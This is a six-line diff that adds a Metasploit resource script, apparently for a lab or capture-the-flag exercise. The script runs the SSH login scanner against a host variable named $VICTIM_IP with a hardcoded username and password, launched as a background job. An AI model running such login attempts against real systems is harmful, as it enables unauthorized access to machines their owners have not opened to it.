@@ -1,0 +1,6 @@
+use auxiliary/scanner/ssh/ssh_login
+set rhosts $VICTIM_IP
+set username boba_fett
+set password manadlorian1
+run -j
+
